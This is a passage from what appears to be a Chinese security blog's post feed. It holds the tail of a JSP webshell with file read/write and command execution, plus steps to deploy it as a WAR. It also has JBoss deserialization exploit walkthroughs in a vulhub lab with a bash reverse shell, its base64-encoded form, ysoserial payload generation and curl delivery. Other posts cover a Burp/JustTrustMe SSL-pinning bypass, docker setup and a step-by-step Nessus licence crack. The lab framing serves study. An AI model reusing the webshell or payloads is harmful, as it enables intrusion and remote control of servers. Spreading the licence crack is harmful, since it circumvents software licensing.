request.getParameter(&quot;z0&quot;)==null?&quot;gbk&quot;: request.getParameter(&quot;z0&quot;) + &quot;&quot;;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(&quot;text/html;charset=&quot; + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;, cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">        if (Z.equals(&quot;A&quot;)) &#123;</span><br><span class="line">            String s = new File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + &quot;\t&quot;);</span><br><span class="line">            if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (Z.equals(&quot;B&quot;)) &#123;</span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;C&quot;)) &#123;</span><br><span class="line">            String l = &quot;&quot;;</span><br><span class="line">            BufferedReader br = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(new FileInputStream(new File(</span><br><span class="line">                            z1))));</span><br><span class="line">            while ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; else if (Z.equals(&quot;D&quot;)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(</span><br><span class="line">                    new OutputStreamWriter(new FileOutputStream(</span><br><span class="line">                            new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;E&quot;)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;F&quot;)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; else if (Z.equals(&quot;G&quot;)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;H&quot;)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;I&quot;)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;J&quot;)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;K&quot;)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;L&quot;)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;M&quot;)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;N&quot;)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;P&quot;)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>把木马文件打包成war包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war .\webshell.jsp</span><br></pre></td></tr></table></figure><p>上传木马文件</p><p><img src="http://image.jh2ing.com/image-20221118230205436.png" alt="image-20221118230205436"></p><p>上传成功之后使用菜刀连接，<code>http://192.168.0.101:8080/shell/webshell.jsp</code>路径为<code>包名/木马文件名</code></p><blockquote><p>注意上传时不要用IE浏览器</p></blockquote><p><img src="http://image.jh2ing.com/image-20221118230302419.png" alt="image-20221118230302419"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://www.cnblogs.com/4thrun/p/15148556.html">https://www.cnblogs.com/4thrun/p/15148556.html</a></p><p><a href="https://www.cnblogs.com/henry666/p/14379888.html?ivk_sa=1024630f">https://www.cnblogs.com/henry666/p/14379888.html?ivk_sa=1024630f</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBoss系列漏洞复现</title>
      <link href="/posts/10279/"/>
      <url>/posts/10279/</url>
      
        <content type="html"><![CDATA[<h3 id="JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</h3><h4 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p><h4 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h4><p><code>5.x和6.x版本</code></p><h4 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h4><h5 id="3-1-环境搭建"><a href="#3-1-环境搭建" class="headerlink" title="3.1 环境搭建"></a>3.1 环境搭建</h5><p><code>docker-compose up -d</code>快速搭建环境</p><p><img src="http://image.jh2ing.com/image-20220902153730562.png" alt="image-20220902153730562"></p><p>访问网址：<code>http://xxx:8080/</code>，即可看到JBoos默认界面</p><p><img src="http://image.jh2ing.com/image-20220902154836657.png" alt="image-20220902154836657"></p><h5 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h5><p>漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化</p><p>通过检测工具发现存在漏洞，工具地址：<code>https://github.com/yunxu1/jboss-_CVE-2017-12149</code></p><p><img src="http://image.jh2ing.com/image-20220902160123735.png" alt="image-20220902160123735"></p><p><strong>反弹shell</strong></p><p>使用bash来反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.103/10888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码</p><p>编码后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzEwODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>序列化数据生成</p><blockquote><p>工具地址：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzEwODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.ser</span><br></pre></td></tr></table></figure><p>这时同级目录下多了一个<code>1.ser</code>文件，然后打开nc工具监听本地端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 10888</span><br></pre></td></tr></table></figure><p>通过brup或者curl工具将这个文件发送到<code>/invoker/readonly</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.0.106:8080/invoker/readonly --data-binary @1.ser</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220909095916586.png" alt="image-20220909095916586"></p><p>发送成功之后发现shell反弹成功</p><p><img src="http://image.jh2ing.com/image-20220909095840964.png" alt="image-20220909095840964"></p><p><strong>第二种反弹方式</strong></p><blockquote><p>链接地址：<a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p></blockquote><p>git下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git@github.com:joaomatosf/JavaDeserH2HC.git</span><br></pre></td></tr></table></figure><p>编译<code>ReverseShellCommonsCollectionsHashMap.java</code> 这里注意一下符号，Windows系统符号为<code>;</code>，Linux系统符号为<code>:</code>，还有需要注意的是Windows平台最好使用系统自带的cmd命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .;commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure><p>生成<code>ser</code>文件，后面跟<code>IP:端口</code>，执行完成之后会创建<code>ReverseShellCommonsCollectionsHashMap.ser</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .;commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.103:10888</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220909134529001.png" alt="image-20220909134529001"></p><p>通过brup或者curl工具将这个文件发送到<code>/invoker/readonly</code>，成功反弹shell</p><p><img src="http://image.jh2ing.com/image-20220909134621866.png" alt="image-20220909134621866"></p><h4 id="4、修复建议"><a href="#4、修复建议" class="headerlink" title="4、修复建议"></a>4、修复建议</h4><ul><li>升级版本</li><li>删除http-invoker.sar组件</li><li>限制访问</li></ul><p><code>...\httpinvoker.sar\invoker.war\WEB-INF</code>下的<code>web.xml</code>的<code>security-constraint</code>标签中，对http-invoker组件进行访问控制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br></pre></td></tr></table></figure><h3 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h3><h4 id="1、漏洞描述-1"><a href="#1、漏洞描述-1" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p><h4 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h4><p><code>JBoss AS 4.x及之前版本</code></p><h4 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h4><h5 id="3-1-环境搭建-1"><a href="#3-1-环境搭建-1" class="headerlink" title="3.1 环境搭建"></a>3.1 环境搭建</h5><p><img src="http://image.jh2ing.com/image-20220909142355364.png" alt="image-20220909142355364"></p><p>环境启动后，目标为<code>http://your-ip:8080</code></p><p>访问<code>http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet</code>很有可能存在漏洞</p><p><img src="http://image.jh2ing.com/image-20220909143133571.png" alt="image-20220909143133571"></p><h5 id="3-2-漏洞利用-1"><a href="#3-2-漏洞利用-1" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h5><p>该漏洞出现在<code>/jbossmq-httpil/HTTPServerILServlet</code>请求中，漏洞利用过程和上面的漏洞利用一样，这里不过多演示。</p><p><img src="http://image.jh2ing.com/image-20220909142809158.png" alt="image-20220909142809158"></p><h4 id="4、修复建议-1"><a href="#4、修复建议-1" class="headerlink" title="4、修复建议"></a>4、修复建议</h4><ul><li>和上面一样</li></ul><h3 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h3><h4 id="1、漏洞描述-2"><a href="#1、漏洞描述-2" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>这是经典的JBoss反序列化漏洞，JBoss在<code>/invoker/JMXInvokerServlet</code>请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。</p><h4 id="2、影响版本-2"><a href="#2、影响版本-2" class="headerlink" title="2、影响版本"></a>2、影响版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10</span><br><span class="line">JBoss AS (Wildly) 6 and earlier</span><br><span class="line">JBoss A-MQ 6.2.0</span><br><span class="line">JBoss Fuse 6.2.0</span><br><span class="line">JBoss SOA Platform (SOA-P) 5.3.1</span><br><span class="line">JBoss Data Grid (JDG) 6.5.0</span><br><span class="line">JBoss BRMS (BRMS) 6.1.0</span><br><span class="line">JBoss BPMS (BPMS) 6.1.0</span><br><span class="line">JBoss Data Virtualization (JDV) 6.1.0</span><br><span class="line">JBoss Fuse Service Works (FSW) 6.0.0</span><br><span class="line">JBoss Enterprise Web Server (EWS) 2.1,3.0</span><br></pre></td></tr></table></figure><h4 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h4><h5 id="3-1-环境搭建-2"><a href="#3-1-环境搭建-2" class="headerlink" title="3.1 环境搭建"></a>3.1 环境搭建</h5><p><img src="http://image.jh2ing.com/image-20220909151614371.png" alt="image-20220909151614371"></p><p>初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p><h5 id="3-2-漏洞利用-2"><a href="#3-2-漏洞利用-2" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h5><p>JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象，所以我们直接将<a href="https://github.com/frohoff/ysoserial">ysoserial</a>生成好的POC附在POST Body中发送即可。整个过程可参考<code>CVE-2017-12149</code></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://www.freebuf.com/articles/web/272033.html">https://www.freebuf.com/articles/web/272033.html</a></p><p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp抓取微信小程序</title>
      <link href="/posts/22530/"/>
      <url>/posts/22530/</url>
      
        <content type="html"><![CDATA[<p>前期准备：</p><ul><li>夜神模拟器</li><li>burp</li><li>JustTrustMe插件</li></ul><p>插件下载地址：</p><blockquote><p><a href="https://github.com/Fuzion24/JustTrustMe/releases">https://github.com/Fuzion24/JustTrustMe/releases</a></p></blockquote><h3 id="1、Xposed-JustTrustMe安装"><a href="#1、Xposed-JustTrustMe安装" class="headerlink" title="1、Xposed+JustTrustMe安装"></a>1、Xposed+JustTrustMe安装</h3><p>安装好夜神模拟器之后，启用Android5</p><p><img src="http://image.jh2ing.com/image-20220901182043477.png" alt="image-20220901182043477"></p><p>打开模拟器之后进入应用商店下载Xposed框架</p><p><img src="http://image.jh2ing.com/image-20220901182158431.png" alt="image-20220901182158431"></p><p>进入Xposed，选择推荐安装，然后重启模拟器，这里我已经安装完成。这里主要root授权选择永久授权</p><p><img src="http://image.jh2ing.com/image-20220901182326587.png" alt="image-20220901182326587"></p><p>然后把下载好的JustTrustMe拖入模拟器，模拟器会自动识别安装，安装完成之后会提示你未使用该模块，进入Xposed里勾选使用该模块，然后重启一下模拟器</p><p><img src="http://image.jh2ing.com/image-20220901182700053.png" alt="image-20220901182700053"></p><h3 id="2、burp抓包配置"><a href="#2、burp抓包配置" class="headerlink" title="2、burp抓包配置"></a>2、burp抓包配置</h3><p>打开burp配置监听端口，ip地址选择当前使用的网卡ip地址</p><p><img src="http://image.jh2ing.com/image-20220901183206779.png" alt="image-20220901183206779"></p><p>模拟器进入设置VLAN选项，长按即可出现修改网络的选项</p><p><img src="http://image.jh2ing.com/image-20220901183409943.png" alt="image-20220901183409943"></p><p>选择高级选择手动配置代理，然后填入burp配置的ip和端口</p><p><img src="http://image.jh2ing.com/image-20220901183518976.png" alt="image-20220901183518976"></p><p>给https协议安装证书，这里我在电脑上使用浏览器打开burp网址，下载CA证书，然后更改后缀名为<code>cer</code>，原来的为<code>der</code>。最终文件名：<code>cacert.cer</code></p><p>直接拖进模拟器</p><p><img src="http://image.jh2ing.com/image-20220901183722726.png" alt="image-20220901183722726"></p><p>模拟器会自动打开存放目录，记住这个目录位置</p><p><img src="http://image.jh2ing.com/image-20220901184200780.png" alt="image-20220901184200780"></p><p>导入证书，进入设置-&gt;安全-&gt;从SD卡安装证书</p><p><img src="http://image.jh2ing.com/image-20220901184316715.png" alt="image-20220901184316715"></p><p>选择刚才的Pictures目录，选择证书</p><p><img src="http://image.jh2ing.com/image-20220901184402911.png" alt="image-20220901184402911"></p><p>然后自己命名选择确定即可安装成功</p><p><img src="http://image.jh2ing.com/image-20220901184507353.png" alt="image-20220901184507353"></p><p>测试可以在burp得到微信小程序数据包</p><p><img src="http://image.jh2ing.com/image-20220901191217824.png" alt="image-20220901191217824"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub本地环境搭建</title>
      <link href="/posts/3352/"/>
      <url>/posts/3352/</url>
      
        <content type="html"><![CDATA[<p>之前通过国外主机搭建vulhub环境，为了节约成本，使用VMware搭建本地环境，避免麻烦虚拟机直接走物理机代理。</p><p>前期准备：</p><ul><li>VMware</li><li>Centos7</li><li>代理软件（v2ray）</li></ul><p>虚拟机安装Centos7之后，设置代理，IP设置为物理机IP，端口为代理软件代理端口。</p><p><img src="http://image.jh2ing.com/image-20220831135432974.png" alt="image-20220831135432974"></p><p>以上是图形化界面的设置，如果是命令行，可在配置文件<code>/etc/profile</code>中添加代理配置进行代理，针对个人用户在<code>~/.bash_profile</code>中修改，临时代理直接命令行<code>export http_proxy=&#39;http://ip:port&#39;</code></p><p>配置文件修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&#x27;http://ip:port&#x27;    //代理服务器ip地址和端口号</span><br><span class="line">export https_proxy=&#x27;http://ip:port&#x27;   //代理服务器ip地址和端口号</span><br></pre></td></tr></table></figure><p>代理软件设置允许来自局域网的连接，注意物理机的防火墙设置，确保虚拟机可以连接到此端口</p><p><img src="http://image.jh2ing.com/image-20220831135554708.png" alt="image-20220831135554708"></p><p>开启之后虚拟机即可访问</p><p><img src="http://image.jh2ing.com/image-20220831141025850.png" alt="image-20220831141025850"></p><p>vulhub需要docker环境，这里直接复制菜鸟教程的安装教程</p><blockquote><p><a href="https://www.runoob.com/docker/centos-docker-install.html">https://www.runoob.com/docker/centos-docker-install.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p>dcoker-compose安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/v2.4.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">$ sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line">$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p>实现docker通过代理pull镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line">nano /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure><p>http-proxy.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://ip:port&quot;</span><br><span class="line">Environment=&quot;HTTPS_PROXY=https://ip:port&quot;</span><br></pre></td></tr></table></figure><p>然后重启docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>查看是否配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl show --property=Environment docker</span><br></pre></td></tr></table></figure><p>docker测试，下载速度很快</p><p><img src="http://image.jh2ing.com/image-20220831154940397.png" alt="image-20220831154940397"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10+Nessus8.15.5破解</title>
      <link href="/posts/57365/"/>
      <url>/posts/57365/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Nessus安装过程不做演示</p></blockquote><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>获取<code>Challenge code</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nessuscli fetch --challenge</span><br></pre></td></tr></table></figure><p>获取插件包，地址如下：</p><blockquote><p><a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true">https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true</a> （邮箱获取验证码）</p><p><a href="https://plugins.nessus.org/v2/offline.php">https://plugins.nessus.org/v2/offline.php</a> （输入Challenge code和邮箱验证码）</p></blockquote><h3 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h3><p>1、管理员打开cmd，停止Tenable服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop &quot;Tenable Nessus&quot;</span><br></pre></td></tr></table></figure><p>2、更改文件属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attrib -s -r -h &quot;D:\Program Files\Tenable\Nessus\nessus\plugins\*.*&quot;</span><br><span class="line">attrib -s -r -h &quot;D:\Program Files\Tenable\Nessus\nessus\plugin_feed_info.inc&quot;</span><br></pre></td></tr></table></figure><p>根据安装路径进行更改，如果没有<code>plugin_feed_info.inc</code>文件就新建一个。</p><p><font color="red">注意<code>plugin_feed_info.inc</code>文件格式</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLUGIN_SET = &quot;202208031750&quot;;</span><br><span class="line">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;</span><br><span class="line">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br></pre></td></tr></table></figure><p>3、更新Nessus插件</p><p>切换到nessus目录下更新插件，插件包也放在此目录下，根据个人习惯，也可以指定插件包路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nessuscli.exe update all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220809124551396.png" alt="image-20220809124551396"></p><p><font color="red">这里注意一下版本，<code>lugin_feed_info.inc</code>文件里的<code>PLUGIN_SET</code>值必须和插件版本一致</font></p><p> 把自己编写的<code>plugin_feed_info.inc</code>复制到<code>plugins</code>文件夹</p><p>4、复制<code>plugin_feed_info.inc</code>文件到文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;D:\Program Files\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc&quot; &quot;D:\Program Files\Tenable\Nessus\nessus&quot;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220809130552736.png" alt="image-20220809130552736"></p><blockquote><p>注意有没有<code>plugin_feed_info.inc</code>文件</p></blockquote><p>5、更改文件属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +r +h &quot;D:\Program Files\Tenable\Nessus\nessus\plugins\*.*&quot; </span><br><span class="line">attrib +s +r +h &quot;D:\Program Files\Tenable\Nessus\nessus\plugin_feed_info.inc&quot;</span><br><span class="line">attrib -s -r -h &quot;D:\Program Files\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc&quot;</span><br></pre></td></tr></table></figure><p>6、启动Nessus服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start &quot;Tenable Nessus&quot;</span><br></pre></td></tr></table></figure><p>访问Nessus：<a href="https://localhost:8834/#/">https://localhost:8834/#/</a></p><p>出现错误直接刷新，就会回到加载页面</p><p><img src="http://image.jh2ing.com/image-20220809132413936.png" alt="image-20220809132413936"></p><p>配置完成之后登录，无ip限制<img src="http://image.jh2ing.com/image-20220809132920948.png" alt="image-20220809132920948"></p><p>插件加载正常，破解完成</p><p><img src="http://image.jh2ing.com/image-20220809133023962.png" alt="image-20220809133023962"></p><h3 id="总结记录"><a href="#总结记录" class="headerlink" title="总结记录"></a>总结记录</h3><p>破解Nessus主要是通过修改<code>plugin_feed_info.inc</code>文件和两个目录下的文件属性。经过测试发现，在以上步骤不修改<code>plugin_feed_info.inc</code>文件，在最后通过自己编写的<code>plugin_feed_info.inc</code>去覆盖两个文件夹下的<code>plugin_feed_info.inc</code>文件，是可以破解成功的。如果在文件属性修改正确、整个步骤都没有错误的前提下，Nessus没有破解成功，可以去尝试覆盖两个文件夹下的<code>plugin_feed_info.inc</code>文件。</p><blockquote><p>注意：在修改文件时都关闭了<code>Tenable Nessus</code>服务</p></blockquote><p>更新插件，执行<code>nessuscli.exe update all-2.0.tar.gz</code>命令之后，通过版本编写<code>plugin_feed_info.inc</code>，然后尝试去覆盖两个文件夹下的<code>plugin_feed_info.inc</code>文件，看是否能够成功，如果不成功还是继续重复以上步骤。</p><p>此教程参考以下链接进行破解，个人自用，防止丢失。</p><p><em>参考链接</em></p><blockquote><p><a href="https://www.ddosi.org/nessus/">https://www.ddosi.org/nessus/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</title>
      <link href="/posts/38434/"/>
      <url>/posts/38434/</url>
      
